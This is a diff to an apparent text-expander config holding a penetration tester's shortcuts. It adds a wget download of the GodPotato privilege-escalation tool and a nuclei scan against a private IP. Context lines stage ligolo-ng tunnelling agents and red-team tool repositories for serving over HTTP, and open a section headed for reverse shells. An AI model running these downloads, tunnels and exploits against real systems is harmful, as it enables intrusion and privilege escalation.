@@ -54,6 +54,7 @@ matches:
       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &                                                                 
       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &  
+      wget -q https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe &
       git clone https://github.com/Flangvik/SharpCollection.git &
       git clone https://github.com/gerbsec/RedTeam-TradeCraft.git &                                                                
       python3 -m http.server 80
@@ -129,6 +130,8 @@ matches:
   - trigger: ":xfreerdp"
     replace: "xfreerdp /dynamic-resolution /cert-ignore /compression /auto-reconnect /v:{{clipboard}} /u:user /p:pass "
 
+  - trigger: ":nuclei"
+    replace: "nuclei -c 50 -retries 3 -u 192.168.189.156"
 # REVERSE SHELLS                                                                
   # LINUX                                                                       
   - trigger: ":rcurl"                                                           
